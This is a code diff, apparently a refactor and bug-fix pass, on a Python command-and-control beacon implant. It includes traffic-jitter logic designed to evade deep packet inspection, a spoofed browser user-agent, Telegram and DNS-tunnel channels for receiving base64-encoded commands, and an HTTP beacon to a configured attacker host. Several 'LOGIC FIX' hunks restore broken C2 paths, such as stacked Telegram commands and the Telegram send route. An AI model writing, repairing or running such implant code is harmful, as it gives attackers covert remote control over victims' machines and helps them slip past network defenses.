@@ -117,16 +117,16 @@ class JitterEngine:
         # LOGIC FIX: Linear distribution is too easy for DPI to signature.
         # Using a primitive Triangular distribution simulation with secrets for "human-like" traffic.
         rng = self.jitter_max - self.jitter_min
-        
+
         # Base jitter + two random weights to lean towards center (Triangular-ish)
-        r1 = (secrets.randbelow(1000) / 1000.0)
-        r2 = (secrets.randbelow(1000) / 1000.0)
+        r1 = secrets.randbelow(1000) / 1000.0
+        r2 = secrets.randbelow(1000) / 1000.0
         tri_factor = (r1 + r2) / 2.0  # Central limit theorem makes this bell-like
-        
+
         jitter_percent = (self.jitter_min + tri_factor * rng) / 100.0
 
         sign = secrets.choice([-1, 1])
-        factor = 1.0 + (sign * jitter_percent)
+        factor = 1.0 + sign * jitter_percent
         return max(0.1, self.base_interval * factor)
 
     def update_interval(self, new: int):
@@ -135,7 +135,11 @@ class JitterEngine:
 
 PROFILES = {
     "default": {
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "user_agent": (
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+            "AppleWebKit/537.36 (KHTML, like Gecko) "
+            "Chrome/120.0.0.0 Safari/537.36"
+        ),
         "headers": {"Accept": "*/*", "Accept-Language": "en-US,en;q=0.9"},
     }
 }
@@ -172,7 +176,10 @@ class TelegramC2:
         self._request("sendMessage", {"chat_id": self.chat_id, "text": msg})
 
     def poll_commands(self) -> list[bytes]:
-        """Long poll for all pending commands (Logic Fix: Don't lose stacked commands)"""
+        """
+        Long poll for all pending commands.
+        Logic Fix: Don't lose stacked commands.
+        """
         updates = self._request("getUpdates", {"offset": self.offset, "timeout": 5})
 
         results = updates.get("result", [])
@@ -189,7 +196,7 @@ class TelegramC2:
                     commands.append(base64.b64decode(b64_cmd))
                 except Exception as e:
                     logger.debug(f"Failed to decode C2 command: {e}")
-        
+
         return commands
 
 
@@ -699,7 +706,7 @@ class HeartbeatManager:
                 remaining = next_run - now
                 if remaining > 0:
                     time.sleep(remaining)
-                
+
                 if self._consecutive_failures >= self._max_failures:
                     logger.error("Max heartbeat failures reached")
                     # Could trigger fallback here
@@ -788,7 +795,6 @@ class C2Channel:
 
         elif self.config.protocol == C2Protocol.DNS and self.config.dns_domain:
             # DNS client initialization would go here (already implemented logic below)
-            pass
             self.dns_tunneler = DNSTunneler(
                 self.config.dns_domain,
                 subdomain_length=self.config.subdomain_length_length
@@ -817,9 +823,8 @@ class C2Channel:
                 self.heartbeat.start()
 
                 return True
-            else:
-                self.status = BeaconStatus.ERROR
-                return False
+            self.status = BeaconStatus.ERROR
+            return False
 
         except Exception as e:
             logger.error(f"C2 connection failed: {e}")
@@ -852,9 +857,13 @@ class C2Channel:
                 # Process any commands from server
                 if response.command:
                     self._handle_command(response)
-                
-                # LOGIC FIX: Check for additional pending commands (especially for Telegram)
-                if hasattr(self, "telegram") and self.config.protocol == C2Protocol.TELEGRAM:
+
+                # LOGIC FIX: Check for additional pending commands
+                # (especially for Telegram)
+                if (
+                        hasattr(self, "telegram")
+                        and self.config.protocol == C2Protocol.TELEGRAM
+                ):
                     extra_cmds = self.telegram.poll_commands()
                     for cmd_bytes in extra_cmds:
                         try:
@@ -868,7 +877,10 @@ class C2Channel:
                             )
                             self._handle_command(extra_resp)
                         except Exception as e:
-                            logger.error(f"Failed to process extra Telegram command: {e}")
+                            logger.error(
+                                f"Failed to process extra Telegram "
+                                f"command: {e}"
+                            )
                 return True
 
             return False
@@ -908,14 +920,21 @@ class C2Channel:
                 )
             elif self.dns_tunneler:
                 success, response = self.dns_tunneler.send_dns_query(encrypted)
-            elif hasattr(self, "telegram") and self.config.protocol == C2Protocol.TELEGRAM:
+            elif (
+                hasattr(self, "telegram")
+                and self.config.protocol == C2Protocol.TELEGRAM
+            ):
                 # LOGIC FIX: Telegram was initialized but never used in send_message
                 self.telegram.send_data(encrypted)
-                # For Telegram, we poll for response immediately or wait for next heartbeat
+                # For Telegram, we poll for response immediately
+                # or wait for next heartbeat
                 # To match the success/response pattern:
                 cmds = self.telegram.poll_commands()
-                success = True # Assume sent if no exception
-                response = cmds[0] if cmds else b"{}" # Mock or return first command as response
+                success = True  # Assume sent if no exception
+                if cmds:
+                    response = cmds[0]
+                else:
+                    response = b"{}"  # Mock or return first command as response
             else:
                 # Direct HTTP/HTTPS
                 success, response = self._send_direct(encrypted)
@@ -942,7 +961,10 @@ class C2Channel:
         """Send data directly without fronting"""
         try:
             protocol = "https" if self.config.protocol == C2Protocol.HTTPS else "http"
-            url = f"{protocol}://{self.config.primary_host}:{self.config.primary_port}/api/beacon"
+            url = (
+                f"{protocol}://{self.config.primary_host}:"
+                f"{self.config.primary_port}/api/beacon"
+            )
 
             request = urllib.request.Request(
                 url,
@@ -1024,9 +1046,9 @@ class C2Channel:
 
     def _generate_id(self) -> str:
         """Generate unique message ID"""
-        return hashlib.sha256(f"{time.time()}{secrets.randbelow(1_000_000)}".encode()).hexdigest()[
-            :16
-        ]
+        return hashlib.sha256(
+            f"{time.time()}{secrets.randbelow(1_000_000)}".encode()
+        ).hexdigest()[:16]
 
     def get_status(self) -> dict[str, Any]:
         """Get channel status"""
